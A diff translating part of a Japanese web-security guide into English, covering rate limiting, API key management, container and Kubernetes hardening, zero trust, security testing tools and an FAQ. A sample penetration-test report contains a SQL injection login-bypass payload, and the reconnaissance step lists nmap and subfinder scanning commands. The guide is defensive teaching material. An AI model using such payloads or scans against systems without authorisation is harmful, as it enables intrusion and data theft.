     local tokens = tonumber(bucket[1]) or tonumber(ARGV[1])
     local last_refill = tonumber(bucket[2]) or tonumber(ARGV[4])
 
-    -- トークン補充
+    -- Refill tokens
     local elapsed = tonumber(ARGV[4]) - last_refill
     local refill_count = math.floor(elapsed / tonumber(ARGV[3])) * tonumber(ARGV[2])
     tokens = math.min(tonumber(ARGV[1]), tokens + refill_count)
 
-    -- トークン消費
+    -- Consume a token
     if tokens > 0 then
       tokens = tokens - 1
       redis.call('HMSET', KEYS[1], 'tokens', tokens, 'last_refill', ARGV[4])
@@ -1445,7 +1445,7 @@ async function tokenBucketRateLimit(key, maxTokens, refillRate, refillInterval) 
   };
 }
 
-// ミドルウェアとして使用
+// Use as middleware
 async function rateLimitMiddleware(req, res, next) {
   const key = req.user ? `user:${req.user.id}` : `ip:${req.ip}`;
   const result = await tokenBucketRateLimit(key, 100, 10, 60000);
@@ -1468,123 +1468,123 @@ async function rateLimitMiddleware(req, res, next) {
 }
 ```
 
-### 11.3 APIキーの安全な管理
+### 11.3 Safe API Key Management
 
 ```
-APIキー管理のベストプラクティス:
+API key management best practices:
 
-① キーの生成:
-  → 最低256ビットのエントロピー
-  → プレフィックスで種類を識別
+① Key generation:
+  → At least 256 bits of entropy
+  → Use a prefix to identify the type
 
   // Node.js
   const crypto = require('crypto');
   function generateApiKey(prefix = 'sk') {
     const key = crypto.randomBytes(32).toString('hex');
     return `${prefix}_${key}`;
-    // 例: sk_a1b2c3d4e5f6...（68文字）
+    // Example: sk_a1b2c3d4e5f6... (68 characters)
   }
 
-② キーの保存:
-  → ハッシュ化して保存（SHA-256）
-  → 生のキーは生成時のみ表示
-  → プレフィックス + 末尾4文字のみ表示: sk_****...abcd
+② Key storage:
+  → Store hashed (SHA-256)
+  → Show the raw key only at generation time
+  → Display only prefix + last 4 characters: sk_****...abcd
 
-③ キーのローテーション:
-  → 定期的なローテーション（90日推奨）
-  → 旧キーの猶予期間（72時間）
-  → CI/CDでの自動ローテーション
+③ Key rotation:
+  → Regular rotation (90 days recommended)
+  → Grace period for old keys (72 hours)
+  → Automated rotation in CI/CD
 
-④ キーの権限制限:
-  → スコープ（read, write, admin）
-  → IPアドレス制限
-  → 有効期限の設定
-  → リファラー制限（フロントエンド用）
+④ Key privilege restrictions:
+  → Scopes (read, write, admin)
+  → IP address restrictions
+  → Expiration date
+  → Referrer restrictions (for frontend)
 ```
 
 ---
 
-## 12. コンテナ・クラウド環境のセキュリティ
+## 12. Container and Cloud Environment Security
 
-### 12.1 コンテナセキュリティ
+### 12.1 Container Security
 
 ```
-コンテナ特有の攻撃ベクトル:
+Container-specific attack vectors:
 
-① コンテナエスケープ:
-  → コンテナからホストOSにアクセス
-  → 脆弱なカーネルバージョン、特権コンテナが原因
+① Container escape:
+  → Access the host OS from within a container
+  → Caused by vulnerable kernel versions or privileged containers
 
-  防御:
-  # Dockerfileのセキュリティベストプラクティス
+  Defense:
+  # Dockerfile security best practices
   FROM node:20-alpine AS builder
   WORKDIR /app
   COPY package*.json ./
   RUN npm ci --only=production
 
   FROM node:20-alpine
-  # 非rootユーザーで実行
+  # Run as non-root user
   RUN addgroup -S appgroup && adduser -S appuser -G appgroup
   WORKDIR /app
   COPY --from=builder /app/node_modules ./node_modules
   COPY . .
 
-  # ファイルシステムを読み取り専用に
+  # Make the filesystem read-only
   RUN chmod -R 555 /app
 
   USER appuser
 
-  # セキュリティ設定
-  # --read-only: ファイルシステムの変更を防止
-  # --no-new-privileges: 権限昇格を防止
-  # --cap-drop=ALL: 全Capabilityを削除
+  # Security flags:
+  # --read-only: prevent filesystem changes
+  # --no-new-privileges: prevent privilege escalation
+  # --cap-drop=ALL: drop all capabilities
 
-② イメージの脆弱性:
-  → ベースイメージに既知の脆弱性
-  → 不要なパッケージの含有
+② Image vulnerabilities:
+  → Known vulnerabilities in the base image
+  → Inclusion of unnecessary packages
 
-  防御:
-  # イメージスキャン
+  Defense:
+  # Image scanning
   $ docker scout cves my-app:latest
   $ trivy image my-app:latest
   $ grype my-app:latest
 
-  # Alpine / Distrolessベースイメージの使用
+  # Use Alpine / Distroless base images
   FROM gcr.io/distroless/nodejs20-debian12
-  # → シェルすら含まない最小イメージ
+  # → Minimal image that does not even include a shell
 
-③ シークレットの漏洩:
-  → Dockerイメージにシークレットがベイク
-  → docker history で閲覧可能
+③ Secret leakage:
+  → Secrets baked into the Docker image
+  → Visible via docker history
 
-  防御:
-  # NG: 環境変数にシークレット
+  Defense:
+  # BAD: secrets in environment variables
   ENV DATABASE_URL=postgres://user:pass@host/db
 
-  # OK: ランタイムで注入
+  # GOOD: inject at runtime
   # docker run -e DATABASE_URL=... my-app
-  # または Kubernetes Secrets / AWS Secrets Manager
+  # or Kubernetes Secrets / AWS Secrets Manager
 ```
 
-### 12.2 Kubernetes セキュリティ
+### 12.2 Kubernetes Security
 
 ```
-Kubernetes 固有の攻撃と対策:
+Kubernetes-specific attacks and defenses:
 
-① RBAC設定不備:
-  → デフォルトのServiceAccountが過剰な権限を持つ
-  → クラスタ全体の管理者権限が不要なPodに付与
+① RBAC misconfiguration:
+  → Default ServiceAccount has excessive privileges
+  → Unnecessary Pods granted cluster-admin
 
-  防御:
-  # 最小権限のServiceAccount
+  Defense:
+  # Least-privilege ServiceAccount
   apiVersion: v1
   kind: ServiceAccount
   metadata:
     name: my-app-sa
     namespace: production
-  automountServiceAccountToken: false  # 不要なら無効化
+  automountServiceAccountToken: false  # Disable if not needed
 
-  # 必要最小限のRBACルール
+  # Minimal RBAC rules
   apiVersion: rbac.authorization.k8s.io/v1
   kind: Role
   metadata:
@@ -1593,26 +1593,26 @@ Kubernetes 固有の攻撃と対策:
   rules:
   - apiGroups: [""]
     resources: ["configmaps"]
-    verbs: ["get", "list"]  # 読み取りのみ
+    verbs: ["get", "list"]  # Read-only
 
-② ネットワークポリシーの未設定:
-  → Pod間の通信が無制限
-  → 侵害されたPodから横方向移動（Lateral Movement）
+② No NetworkPolicy set:
+  → Unrestricted inter-Pod communication
+  → Lateral movement from a compromised Pod
 
-  防御:
-  # デフォルト拒否 + 明示的許可
+  Defense:
+  # Default deny + explicit allow
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: default-deny-all
     namespace: production
   spec:
-    podSelector: {}  # 全Pod対象
+    podSelector: {}  # Applies to all Pods
     policyTypes:
     - Ingress
     - Egress
 
-  # 特定のPod間のみ通信許可
+  # Allow only specific Pod-to-Pod communication
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
@@ -1632,7 +1632,7 @@ Kubernetes 固有の攻撃と対策:
         port: 8080
 
 ③ Pod Security Standards:
-  # Restricted レベル（最も厳格）
+  # Restricted level (most strict)
   apiVersion: v1
   kind: Pod
   metadata:
@@ -1663,91 +1663,93 @@ Kubernetes 固有の攻撃と対策:
 
 ---
 
-## 13. ゼロトラストセキュリティ
+## 13. Zero Trust Security
 
 ```
-ゼロトラストアーキテクチャの原則:
+Zero Trust Architecture principles:
 
-従来モデル（境界型セキュリティ）:
-  インターネット → ファイアウォール → 社内ネットワーク（信頼）
-  → 一度内部に入れば全リソースにアクセス可能
-  → 内部犯行や横方向移動に脆弱
+Traditional model (perimeter security):
+  Internet → Firewall → Internal network (trusted)
+  → Once inside, access to all resources is possible
+  → Vulnerable to insider threats and lateral movement
 
-ゼロトラストモデル:
-  「Never Trust, Always Verify（決して信頼せず、常に検証）」
+Zero Trust model:
+  "Never Trust, Always Verify"
 
-  原則:
-  ① 明示的な検証: 全アクセスを認証・認可
-  ② 最小権限アクセス: 必要最小限の権限のみ付与
-  ③ 侵害を前提とした設計: 侵害されても被害を最小化
+  Principles:
+  ① Explicit verification: authenticate and authorize all access
+  ② Least privilege access: grant only the minimum necessary privileges
+  ③ Assume breach: minimize damage even if breached
 
-  アーキテクチャ:
+  Architecture:
   ┌──────────────────────────────────────────────┐
-  │  ユーザー/デバイス                              │
-  │    │                                          │
-  │    ▼                                          │
-  │  Policy Enforcement Point (PEP)               │
-  │    │ ← 全リクエストを検証                       │
-  │    │                                          │
-  │    ├── デバイス健全性チェック                     │
-  │    │   → OS バージョン、パッチ状況               │
-  │    │   → ディスク暗号化、アンチウイルス           │
-  │    │                                          │
-  │    ├── ユーザー認証                              │
-  │    │   → MFA必須                               │
-  │    │   → コンテキスト認証（場所、時間、行動）      │
-  │    │                                          │
-  │    ├── 認可チェック                              │
-  │    │   → ABAC（属性ベース）                      │
-  │    │   → リクエストごとにポリシー評価             │
-  │    │                                          │
-  │    ▼                                          │
-  │  リソース（マイクロセグメンテーション）            │
-  │    → 各リソースは独立したセキュリティ境界          │
-  │    → E2E暗号化（mTLS）                          │
-  │    → 全通信をログ記録                            │
+  │  User / Device                               │
+  │    │                                         │
+  │    ▼                                         │
+  │  Policy Enforcement Point (PEP)              │
+  │    │ ← validates every request               │
+  │    │                                         │
+  │    ├── Device health check                   │
+  │    │   → OS version, patch status            │
+  │    │   → Disk encryption, antivirus          │
+  │    │                                         │
+  │    ├── User authentication                   │
+  │    │   → MFA required                        │
+  │    │   → Contextual auth (location, time,    │
+  │    │       behavior)                         │
+  │    │                                         │
+  │    ├── Authorization check                   │
+  │    │   → ABAC (attribute-based)              │
+  │    │   → Policy evaluated per request        │
+  │    │                                         │
+  │    ▼                                         │
+  │  Resources (microsegmentation)               │
+  │    → Each resource has its own security      │
+  │      boundary                               │
+  │    → End-to-end encryption (mTLS)            │
+  │    → All communication is logged             │
   └──────────────────────────────────────────────┘
 
-  実装要素:
-  ① アイデンティティプロバイダー（IdP）:
+  Implementation elements:
+  ① Identity Provider (IdP):
     → Okta, Azure AD, Google Workspace
-    → SSO + MFA + デバイストラスト
+    → SSO + MFA + device trust
 
-  ② ネットワークアクセス制御:
-    → BeyondCorp（Google）
+  ② Network access control:
+    → BeyondCorp (Google)
     → Cloudflare Access / Zscaler
-    → VPNレス: アプリケーション単位でアクセス制御
+    → VPN-less: per-application access control
 
-  ③ マイクロセグメンテーション:
+  ③ Microsegmentation:
     → Kubernetes NetworkPolicy
     → AWS Security Groups / Azure NSG
-    → サービスメッシュ（Istio / Linkerd）
+    → Service mesh (Istio / Linkerd)
 
-  ④ 継続的な監視と分析:
-    → SIEM（Splunk, Elastic Security）
-    → UEBA（User and Entity Behavior Analytics）
-    → 異常検知による自動ブロック
+  ④ Continuous monitoring and analysis:
+    → SIEM (Splunk, Elastic Security)
+    → UEBA (User and Entity Behavior Analytics)
+    → Automated blocking via anomaly detection
 ```
 
 ---
 
-## 14. セキュリティテストの実践
+## 14. Practical Security Testing
 
 ### 14.1 SAST / DAST / SCA
 
 ```
-セキュリティテストの種類:
+Types of security testing:
 
-① SAST（Static Application Security Testing）:
-  → ソースコードの静的解析
-  → 開発段階で脆弱性を検出
+① SAST (Static Application Security Testing):
+  → Static analysis of source code
+  → Detects vulnerabilities at the development stage
 
-  ツール:
-  - Semgrep: カスタムルール対応、OSS
-  - SonarQube: 多言語対応、CI/CD統合
+  Tools:
+  - Semgrep: custom rules, OSS
+  - SonarQube: multi-language support, CI/CD integration
   - CodeQL (GitHub): GitHub Advanced Security
 
-  CI/CD統合例（GitHub Actions）:
+  CI/CD integration example (GitHub Actions):
   - name: Run Semgrep
     uses: returntocorp/semgrep-action@v1
     with:
@@ -1756,80 +1758,80 @@ Kubernetes 固有の攻撃と対策:
         p/javascript
         p/typescript
 
-② DAST（Dynamic Application Security Testing）:
-  → 実行中のアプリケーションに対するテスト
-  → 実際の攻撃をシミュレート
+② DAST (Dynamic Application Security Testing):
+  → Testing against a running application
+  → Simulates actual attacks
 
-  ツール:
-  - OWASP ZAP: 無料、プロキシ型
-  - Burp Suite: 商用、高機能
-  - Nuclei: テンプレートベース、高速
+  Tools:
+  - OWASP ZAP: free, proxy-based
+  - Burp Suite: commercial, feature-rich
+  - Nuclei: template-based, fast
 
-  ZAPの自動スキャン:
+  ZAP automated scan:
   $ docker run -t owasp/zap2docker-stable zap-baseline.py \
     -t https://app.example.com \
     -r report.html
 
-③ SCA（Software Composition Analysis）:
-  → 依存ライブラリの脆弱性検出
+③ SCA (Software Composition Analysis):
+  → Detects vulnerabilities in dependent libraries
 
-  ツール:
+  Tools:
   - npm audit / yarn audit
-  - Snyk: 商用、修正PR自動作成
-  - Dependabot: GitHub統合
-  - Trivy: コンテナイメージ + ファイルシステム
+  - Snyk: commercial, auto-creates fix PRs
+  - Dependabot: GitHub integration
+  - Trivy: container images + filesystem
 
-  自動化:
+  Automation:
   $ npm audit --audit-level=high
   $ trivy fs --severity HIGH,CRITICAL .
 ```
 
-### 14.2 ペネトレーションテストの基本
+### 14.2 Basics of Penetration Testing
 
 ```
-ペネトレーションテストの流れ:
+Penetration testing flow:
 
-  1. スコープ定義:
-     → テスト対象のシステム/ネットワーク範囲
-     → テスト方法（ブラックボックス/ホワイトボックス）
-     → テスト期間と制約条件
+  1. Scope definition:
+     → Target systems/network scope
+     → Test method (black box / white box)
+     → Test period and constraints
 
-  2. 情報収集（Reconnaissance）:
-     → パッシブ: OSINT、DNS列挙、WHOIS
-     → アクティブ: ポートスキャン、サービス列挙
+  2. Reconnaissance:
+     → Passive: OSINT, DNS enumeration, WHOIS
+     → Active: port scanning, service enumeration
 
      $ nmap -sV -sC -p- target.example.com
      $ subfinder -d example.com | httpx -probe
 
-  3. 脆弱性識別:
-     → 自動スキャン + 手動検証
-     → 認証バイパス、インジェクション、設定不備
+  3. Vulnerability identification:
+     → Automated scanning + manual verification
+     → Auth bypass, injection, misconfiguration
 
-  4. 脆弱性悪用（Exploitation）:
-     → 発見した脆弱性の実証
-     → 影響範囲の確認
-     → 横方向移動の試行
+  4. Exploitation:
+     → Proof of concept for discovered vulnerabilities
+     → Confirm scope of impact
+     → Attempt lateral movement
 
-  5. レポート作成:
-     → 発見事項の優先度分類（Critical/High/Medium/Low）
-     → 再現手順の詳細記録
-     → 修正推奨事項の提示
+  5. Report writing:
+     → Prioritize findings (Critical/High/Medium/Low)
+     → Record detailed reproduction steps
+     → Present remediation recommendations
 
-  報告テンプレート:
+  Report template:
   ┌──────────────────────────────────────────┐
-  │ 脆弱性ID: VULN-2024-001                   │
-  │ タイトル: SQLインジェクション（認証バイパス）│
-  │ 深刻度: Critical (CVSS 9.8)               │
-  │ 影響: データベース全データの窃取が可能       │
-  │ 再現手順:                                  │
-  │   1. /login エンドポイントにアクセス         │
-  │   2. username: ' OR 1=1-- を入力           │
-  │   3. パスワード: 任意                       │
-  │   4. 管理者としてログイン成功               │
-  │ 修正推奨:                                  │
-  │   - Prepared Statementの使用               │
-  │   - 入力バリデーションの追加                │
-  │   - WAFルールの追加（暫定対策）             │
+  │ Vulnerability ID: VULN-2024-001           │
+  │ Title: SQL Injection (Authentication Bypass)│
+  │ Severity: Critical (CVSS 9.8)             │
+  │ Impact: All database data can be stolen   │
+  │ Reproduction steps:                       │
+  │   1. Access /login endpoint               │
+  │   2. Enter username: ' OR 1=1--           │
+  │   3. Any password                         │
+  │   4. Successfully logged in as admin      │
+  │ Remediation recommendations:              │
+  │   - Use Prepared Statements               │
+  │   - Add input validation                  │
+  │   - Add WAF rule (interim measure)        │
   └──────────────────────────────────────────┘
 ```
 
@@ -1837,50 +1839,50 @@ Kubernetes 固有の攻撃と対策:
 
 ## FAQ
 
-### Q1: セキュリティヘッダーの最小構成として何を設定すべきか?
+### Q1: What is the minimum set of security headers to configure?
 
-最低限設定すべきセキュリティヘッダーは以下の5つです。(1) `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` でHTTPS強制。(2) `Content-Security-Policy: default-src 'self'; script-src 'self'` でXSS防止。(3) `X-Content-Type-Options: nosniff` でMIMEタイプのスニッフィング防止。(4) `X-Frame-Options: DENY` でクリックジャッキング防止。(5) `Referrer-Policy: strict-origin-when-cross-origin` でリファラー情報の漏洩防止。これらを全ページに適用することで、一般的なWebアプリケーション攻撃の大半を防御できます。Nginxの場合は`add_header`ディレクティブ、Express.jsの場合は`helmet`ミドルウェアで一括設定が可能です。
+The minimum five security headers to configure are: (1) `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to enforce HTTPS. (2) `Content-Security-Policy: default-src 'self'; script-src 'self'` to prevent XSS. (3) `X-Content-Type-Options: nosniff` to prevent MIME type sniffing. (4) `X-Frame-Options: DENY` to prevent clickjacking. (5) `Referrer-Policy: strict-origin-when-cross-origin` to prevent Referer information leakage. Applying these to all pages defends against the majority of common web application attacks. In Nginx, use the `add_header` directive; in Express.js, the `helmet` middleware can set them all at once.
 
-### Q2: DDoS攻撃を受けた場合、最初に何をすべきか?
+### Q2: What should you do first when you detect a DDoS attack?
 
-DDoS攻撃を検知した場合の初動対応は以下の手順です。(1) まず攻撃の種類を特定します（L3/L4のボリューメトリック攻撃か、L7のアプリケーション攻撃か）。ネットワーク帯域が飽和しているならボリューメトリック攻撃、サーバーCPU/メモリが逼迫しているならアプリケーション攻撃です。(2) CDN/WAFプロバイダー（Cloudflare, AWS Shieldなど）の「Under Attack」モードを有効化します。(3) 攻撃元IPの特徴を分析し、特定の国やASNからの攻撃であればGeo-blockingやASNブロックを実施します。(4) アプリケーションレベルではレート制限を厳格化し、CAPTCHAチャレンジを導入します。(5) 攻撃のログを保全し、ISPやクラウドプロバイダーのセキュリティチームに連絡します。
+The initial response when a DDoS attack is detected: (1) First, identify the type of attack (L3/L4 volumetric or L7 application attack). If network bandwidth is saturated, it is a volumetric attack; if server CPU/memory is under pressure, it is an application attack. (2) Enable "Under Attack" mode on your CDN/WAF provider (Cloudflare, AWS Shield, etc.). (3) Analyze the characteristics of attack source IPs; if the attack is from a specific country or ASN, apply geo-blocking or ASN blocking. (4) At the application level, tighten rate limits and introduce CAPTCHA challenges. (5) Preserve attack logs and contact the security team of your ISP or cloud provider.
 
-### Q3: SQLインジェクションはORMを使っていれば完全に防げるか?
+### Q3: Does using an ORM completely prevent SQL injection?
 
-ORMを使用していても、SQLインジェクションのリスクは完全にはなくなりません。ORMのクエリビルダーが自動的にパラメータ化する標準的なCRUD操作は安全ですが、以下のケースでは依然として脆弱です。(1) ORMの`raw`メソッドやカスタムSQL文を文字列結合で構築する場合。(2) ORMのバグや特定のオペレーターが意図せずインジェクション可能な場合（例: MongoDBの`$where`演算子）。(3) ストアドプロシージャ内で動的SQLを使用する場合。対策として、ORMを使用する場合でも、ユーザー入力は必ずバリデーションし、`raw`クエリを使用する場合はプレースホルダを活用してください。
+Even when using an ORM, the risk of SQL injection is not completely eliminated. Standard CRUD operations where the ORM's query builder automatically parameterizes are safe, but the following cases still have vulnerabilities: (1) Building custom SQL statements or using raw methods with string concatenation. (2) ORM bugs or specific operators that may inadvertently allow injection (e.g., MongoDB's `$where` operator). (3) Dynamic SQL inside stored procedures. As a countermeasure, even when using an ORM, always validate user input and use placeholders when executing raw queries.
 
-### Q4: XSSとCSRFの違いは何か? 両方の対策が必要な理由は?
+### Q4: What is the difference between XSS and CSRF? Why do we need to defend against both?
 
-XSS（Cross-Site Scripting）はブラウザ上で悪意あるスクリプトを実行させる攻撃で、CSRF（Cross-Site Request Forgery）は認証済みユーザーに意図しないリクエストを送信させる攻撃です。XSSは「攻撃者のコードがユーザーのブラウザで実行される」のに対し、CSRFは「ユーザー自身のブラウザが正規のリクエストを送信する」という点が根本的に異なります。XSSが成功するとCSRFトークンも窃取できるため、XSS対策はCSRF対策の前提条件です。両方の対策が必要な理由は、CSRFトークンだけではXSSを防げず、CSPだけではCSRFを防げないためです。多層防御（Defense in Depth）の原則に従い、CSP+エスケープ（XSS対策）とCSRFトークン+SameSite Cookie（CSRF対策）を組み合わせることが必須です。
+XSS (Cross-Site Scripting) is an attack that executes malicious scripts in the browser, while CSRF (Cross-Site Request Forgery) is an attack that causes an authenticated user to send unintended requests. XSS means "the attacker's code runs in the user's browser," while CSRF means "the user's own browser sends a legitimate-looking request" — these are fundamentally different. If XSS succeeds, CSRF tokens can also be stolen, so XSS defense is a prerequisite for CSRF defense. Both defenses are needed because CSRF tokens alone cannot prevent XSS, and CSP alone cannot prevent CSRF. Following the principle of Defense in Depth, combining CSP + escaping (XSS defense) with CSRF tokens + SameSite Cookie (CSRF defense) is mandatory.
 
-### Q5: ゼロデイ脆弱性に対してどのような備えが可能か?
+### Q5: What preparations can be made against zero-day vulnerabilities?
 
-ゼロデイ脆弱性（パッチ未提供の脆弱性）に対する完全な防御は不可能ですが、被害を最小化する備えは可能です。(1) WAF（Web Application Firewall）で一般的な攻撃パターンをブロックし、仮想パッチを適用できる体制を整えます。(2) ネットワークセグメンテーションとマイクロセグメンテーションで、侵害されたコンポーネントからの横方向移動を制限します。(3) RASP（Runtime Application Self-Protection）で、アプリケーション内部から異常な動作をリアルタイム検知します。(4) 最小権限の原則を徹底し、各コンポーネントが必要最小限のリソースにのみアクセスできるようにします。(5) インシデント対応計画を事前に策定し、脆弱性公開から24時間以内にパッチ適用できるCI/CDパイプラインを構築しておきます。
+Complete defense against zero-day vulnerabilities (vulnerabilities with no patch available) is impossible, but preparations to minimize damage are possible. (1) Deploy a WAF to block common attack patterns and maintain the ability to apply virtual patches. (2) Use network segmentation and microsegmentation to limit lateral movement from a compromised component. (3) Use RASP (Runtime Application Self-Protection) to detect anomalous behavior from inside the application in real time. (4) Strictly enforce the principle of least privilege so each component can access only the minimum necessary resources. (5) Establish an incident response plan in advance and build a CI/CD pipeline capable of applying patches within 24 hours of a vulnerability disclosure.
 
 ---
 
-## まとめ
+## Summary
 
-| 攻撃 | 防御 |
-|------|------|
+| Attack | Defense |
+|--------|---------|
 | MITM | HTTPS + HSTS + HSTS Preload |
-| DNS汚染 | DNSSEC + レジストラ保護 |
-| DDoS | CDN/WAF + レート制限 + Anycast |
-| XSS | CSP + エスケープ + HttpOnly + Trusted Types |
-| CSRF | CSRFトークン + SameSite Cookie |
+| DNS Poisoning | DNSSEC + Registrar protection |
+| DDoS | CDN/WAF + Rate limiting + Anycast |
+| XSS | CSP + Escaping + HttpOnly + Trusted Types |
+| CSRF | CSRF token + SameSite Cookie |
 | SQLi | Prepared Statement + ORM |
-| SSRF | URLホワイトリスト + IP検証 + IMDSv2 |
-| CORS | 明示的なオリジン許可 |
-| サプライチェーン | 依存監査 + SCA + SBOM |
-| 設定ミス | セキュリティヘッダー + ハードニング |
+| SSRF | URL whitelist + IP validation + IMDSv2 |
+| CORS | Explicit origin allowlist |
+| Supply chain | Dependency audit + SCA + SBOM |
+| Misconfiguration | Security headers + Hardening |
 
 ---
 
-## 次に読むべきガイド
+## Next Guides to Read
 
 ---
 
-## 参考文献
+## References
 1. OWASP. "OWASP Top 10." 2021.
 2. NIST. "SP 800-53: Security and Privacy Controls." 2020.
 3. NIST. "SP 800-61: Computer Security Incident Handling Guide." 2012.
